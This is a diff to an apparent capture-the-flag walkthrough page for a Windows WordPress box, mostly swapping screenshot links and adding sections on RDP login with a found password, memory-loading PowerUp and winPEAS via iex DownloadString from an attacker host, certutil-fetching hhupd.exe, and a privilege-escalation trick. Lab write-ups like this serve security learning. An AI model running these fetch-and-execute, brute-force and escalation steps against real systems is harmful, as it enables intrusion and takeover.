@@ -10,7 +10,7 @@
 nmap -A $VICTIM
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
 ### Scan all ports
 
@@ -21,7 +21,7 @@ port 5986 discovered. Potentially we can use this later for WinRM.
 <pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 ### HTTP port 80
 
@@ -39,7 +39,7 @@ dirb http://$VICTIM:80 /usr/share/wordlists/dirb/big.txt
 wpscan --url http://$VICTIM/retro
 ```
 
-<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -47,7 +47,7 @@ wpscan --url http://$VICTIM/retro
 wpscan --url http://$VICTIM/retro --enumerate u
 ```
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
 
 ### Burp
 
@@ -64,7 +64,7 @@ Content-Length: 91
 </methodCall>
 ```
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -82,7 +82,7 @@ hydra -l wade -P darkweb2017-top1000.txt $VICTIM/retro http-post-form "/retro/wp
 
 wade added his password to one of the blog posts and from there I could login to wp-login.
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -91,7 +91,7 @@ Username: wade
 Password: parzival
 ```
 
-<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -115,7 +115,7 @@ zip revshell.zip revshell.php
 nc -lvnp 443
 ```
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
 
 I realized my reverse shell wasn't working as it is a Windows box. I uploaded a web shell and ran commands to realize this.
 
@@ -142,11 +142,11 @@ I realized my reverse shell wasn't working as it is a Windows box. I uploaded a 
 
 
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
 
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -345,15 +345,11 @@ echo '</pre>';
 rlwrap nc -lvnp 9000
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
 
 
 
 Load Invoke-winPEAS.ps1 into memory.
-
-
-
-
 
 **Kali**
 
@@ -376,7 +372,7 @@ Invoke-AllChecks
 <strong>iex​(New-Object Net.WebClient).DownloadString('http://$KALI:81/Invoke-winPEAS.ps1') 
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -405,11 +401,72 @@ Invoke-AllChecks
 
 
 
+
+
+
+
+After a lot of time wasted I realized there was no where to write files to and this account was a dead end. Then tried to RDP in as wade since we had a potential password for him.
+
 **Kali**
 
 ```
-cp /root/Rooms/Follina-MSDT/nc64.exe .
+xfreerdp +clipboard /u:"wade" /v:$VICTIM:3389 /size:1024x568 /smart-sizing:800x1200
+Password: parzival
+```
+
+<figure><img src="../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
+
+Load PowerUp.ps1 into memory.
+
+**Kali**
+
+```
+wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
 python2 -m SimpleHTTPServer 81
+```
+
+Add the following line at the bottom to PowerUp.ps1 so it Invokes all checks automatically once downloaded
+
+**PowerUp.ps1**
+
+```
+Invoke-AllChecks
+```
+
+**Victim(powershell)**
+
+<pre><code>powershell -ep bypass
+<strong>iex​(New-Object Net.WebClient).DownloadString('http://$KALI:81/PowerUp.ps1')
+</strong></code></pre>
+
+**Kali**
+
+```
+wget https://gist.githubusercontent.com/S3cur3Th1sSh1t/d14c3a14517fd9fb7150f446312d93e0/raw/2318ef41f55e7e1a2172a2e67551201c24ee7681/Invoke-winPEAS.ps1
+python2 -m SimpleHTTPServer 81
+```
+
+Add the following line at the bottom to PowerUp.ps1 so it Invokes all checks automatically once downloaded
+
+**Invoke-winPEAS.ps1**
+
+```
+Invoke-AllChecks
+```
+
+**Victim(powershell)**
+
+<pre><code>powershell -ep bypass
+<strong>iex​(New-Object Net.WebClient).DownloadString('http://$KALI:81/Invoke-winPEAS.ps1') 
+</strong></code></pre>
+
+
+
+**Victim(cmd)**
+
+```
+cd C:\
+mkdir test
 ```
 
 
@@ -418,5 +475,45 @@ python2 -m SimpleHTTPServer 81
 
 
 
+## Privilege Escalation Option #1
+
+For this I wouldn't normally know how to detect but when you open up chrome  the exploit is already bookmarked.
+
+<figure><img src="../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+Download [https://packetstormsecurity.com/files/download/14437/hhupd.exe](https://packetstormsecurity.com/files/download/14437/hhupd.exe)
+
+```
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim(cmd)**
+
+```
+cd Downloads
+certutil -urlcache -f http://10.10.162.126:81/hhupd.exe hhupd.exe
+```
+
+<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
 
 
+
+<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
+
+Navigate to **C:\Windows\System32** and type in **\*.\*** to show all files.
+
+<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+
+Open the cmd prompt and it open as an Administrator account, but note if you already had Internet explorer open it won't work so make sure it is closed before starting
+
+<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
